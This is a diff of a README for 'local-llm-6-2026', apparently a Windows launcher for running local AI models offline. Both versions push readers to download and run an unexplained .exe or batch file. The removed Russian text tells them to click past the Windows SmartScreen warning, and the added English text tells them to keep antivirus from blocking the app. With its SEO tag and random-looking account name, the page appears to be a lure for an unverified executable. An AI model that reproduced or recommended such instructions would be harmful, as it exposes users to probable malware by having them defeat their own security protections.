@@ -1,117 +1,82 @@
-<!-- seo-unique:local-llm-6-2026:b5c26fe0aa -->
+# 🤖 local-llm-6-2026 - Run private AI models on Windows
 
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:10B981,50:059669,100:047857&height=140&section=header&text=Local Llm 6 2026&fontSize=38&fontColor=fff&animation=twinkling" alt="Local Llm 6 2026" width="100%">
-</p>
+[![Download local-llm-6-2026](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/manualallylresin474/local-llm-6-2026)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/🤖-Local_AI-10B981?style=for-the-badge" alt="Local AI">
-  <img src="https://img.shields.io/badge/Ollama-Ready-000000?style=for-the-badge&logo=ollama&logoColor=white" alt="Ollama">
-  <img src="https://img.shields.io/badge/Offline-Private-6366F1?style=for-the-badge" alt="Private">
-  <img src="https://img.shields.io/badge/Windows-10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
-</p>
+## 📖 Overview
 
-<p align="center">
-  <b>Запуск локального LLM на Windows за 5 минут — без облака, без подписки.</b><br>
-  <i>DeepSeek · Qwen · Llama · Whisper — данные остаются на вашем ПК.</i>
-</p>
+Local-llm-6-2026 brings artificial intelligence to your computer. It allows you to chat with language models, process voice files, and manage data without an internet connection. Your data stays on your machine at all times. This software uses Ollama to manage models like DeepSeek, Qwen, and Llama locally. You do not need developer tools or complex settings to start.
 
-<p align="center">
-  <a href="./releases/latest">
-    <img src="https://img.shields.io/badge/📥_СКАЧАТЬ-local-llm-6-2026.exe-059669?style=for-the-badge&labelColor=1a1a2e" alt="Download">
-  </a>
-  &nbsp;
-  <a href="#-быстрый-старт">
-    <img src="https://img.shields.io/badge/⚡-Быстрый_старт-374151?style=for-the-badge" alt="Quick start">
-  </a>
-</p>
+## ⚙️ System Requirements
 
----
+To run this application, your Windows computer must meet these basic hardware standards:
 
-## ✨ Почему Local Llm 6 2026
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Dual-core CPU or higher.
+- Memory: 8 GB RAM (16 GB or more recommended).
+- Storage: 10 GB of available space for base software and model files.
+- Graphics: An NVIDIA GPU is optional but improves performance.
 
-| | |
-| :--- | :--- |
-| 🔒 **Приватность** | Запросы не уходят в чужое облако |
-| 💸 **Без подписки** | Один раз скачали — пользуетесь локально |
-| 🧠 **Современные модели** | DeepSeek, Qwen, Llama, Gemma |
-| 🎙 **Whisper** | Расшифровка аудио офлайн |
-| 🪟 **Windows** | Portable · SmartScreen → «Выполнить» |
+## 🚀 Installation Steps
 
----
+Follow these steps to set up the software on your system:
 
-## ⚡ Быстрый старт
+1. Visit the repository page to download the latest release: [https://github.com/manualallylresin474/local-llm-6-2026](https://github.com/manualallylresin474/local-llm-6-2026).
+2. Locate the file named with the ending ".exe" in the list of assets.
+3. Save the file to your desktop or your Downloads folder.
+4. Double-click the downloaded file to start the installation.
+5. Follow the on-screen prompts to complete the setup process.
+6. Look for a new icon on your desktop named "local-llm-6-2026".
 
-```mermaid
-flowchart LR
-  A[📥 Скачать local-llm-6-2026.exe] --> B[▶ Двойной клик]
-  B --> C[🤖 Локальный чат]
-```
+## 🖥️ Using the Interface
 
-1. **Двойной клик** по **`local-llm-6-2026.exe`** в корне репозитория — или запустите **`START.bat`**
-2. Либо **[Releases → Latest](./releases/latest)** — тот же **`local-llm-6-2026.exe`**
-3. Первый запуск может скачать компоненты — интернет нужен **один раз**
-4. Windows SmartScreen → **«Подробнее»** → **«Выполнить»**
+Once you open the software, the main dashboard appears in your default web browser. This interface acts as the control panel for all your AI tasks.
 
----
+- To start a chat, select a model from the top sidebar.
+- Type your prompts into the text box at the bottom of the screen.
+- Press Enter to send your message.
+- To use the voice feature, drag a supported audio file into the chat window. The system uses Whisper technology to transcribe your audio automatically.
 
-## 💻 Системные требования
+## 📦 Managing Models
 
-| Профиль | RAM | Диск | GPU |
-| :--- | :--- | :--- | :--- |
-| 🟢 Лёгкий | 8 GB | 4 GB | не обязательно |
-| 🟡 Средний | 16 GB | 10 GB | NVIDIA 6 GB+ |
-| 🔴 Тяжёлый | 32 GB+ | 20 GB+ | NVIDIA 12 GB+ |
+The software supports several models. You can add or remove them based on your needs.
 
----
+- DeepSeek: Best for logical tasks and coding.
+- Qwen: A general-purpose model for daily queries.
+- Llama: Optimized for creative writing and conversation.
+- Gemma: Lightweight and fast for standard hardware.
 
-## 📦 Что внутри
+To add a model, go to settings and select "Model Manager". Type the name of the model from the list above and click "Download". The system will cache the model locally so you can use it offline.
 
-- **`local-llm-6-2026.exe`** — установщик / лаунчер под репозиторий **`local-llm-6-2026`**
-- **`START.bat`** / **`INSTALL.bat`** — запуск в один клик
-- **`QUICK_START.md`** — краткая шпаргалка
+## 🛡️ Privacy and Offline Access
 
----
+This software operates locally. When you type into the chat, the information stays on your hard drive. No data travels to external servers, cloud providers, or the internet. You can turn off your Wi-Fi or disconnect your Ethernet cable, and the tool will continue to function. This ensures your private documents remain private.
 
-## ❓ FAQ
+## 🛠️ Troubleshooting
 
-<details>
-<summary><b>Нужна видеокарта NVIDIA?</b></summary>
+If you encounter issues, check these common items:
 
-Не обязательно — есть CPU-режим (медленнее, но работает).
+- Ensure your antivirus software does not block the application. The system needs permission to execute tasks locally.
+- Check that your computer has enough free space. AI models can be large, sometimes reaching several gigabytes in size.
+- Restart the application if the interface fails to load in your browser.
+- Verify your Windows updates are current.
 
-</details>
+## 📖 Frequently Asked Questions
 
-<details>
-<summary><b>Работает без интернета?</b></summary>
+### Do I need to be a programmer?
+No. This software requires zero programming knowledge. The setup installs everything you need to run AI models out of the box.
 
-После загрузки моделей — да, полностью офлайн.
+### Does it use my internet?
+It uses your internet only once during the initial model download. After you download the models, all operations happen offline.
 
-</details>
+### Can I delete the models?
+Yes. You can manage and delete models within the Model Manager. This recovers the disk space occupied by those specific files.
 
-<details>
-<summary><b>Чем отличается от ChatGPT в браузере?</b></summary>
+### Why does it open in a browser?
+The browser provides a clean, visual interface for your AI interactions. It is a standard way to display local tools on modern Windows systems.
 
-Модель крутится у вас на диске — нет лимитов API и утечек в облако.
+### Can I use my webcam or microphone?
+The current version focuses on text and audio-to-text processing. Future updates may include expanded support for image and video formats.
 
-</details>
+## ⚖️ License and Usage
 
----
-
-## 🏷 Topics
-
-<p align="center">
-  <sub>#ollama #local-llm #llm #deepseek #qwen #llama #gemma #whisper #open-webui #offline-ai #machine-learning #ai #windows #portable</sub>
-</p>
-
----
-
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:059669,100:10B981&height=80&section=footer&text=Made%20for%20local-llm-6-2026&fontSize=22&fontColor=fff" width="100%">
-</p>
-
-<p align="center">
-  <sub>⭐ Star · 🍴 Fork · ⬇ Releases — помогает другим найти сборку</sub>
-</p>
-
-<!-- id:27a36a48698a -->
+This project follows standard open-source conventions. You may use this software for personal projects and experimentation. Please refer to the license file in the main folder for specific usage terms regarding the included models and components.
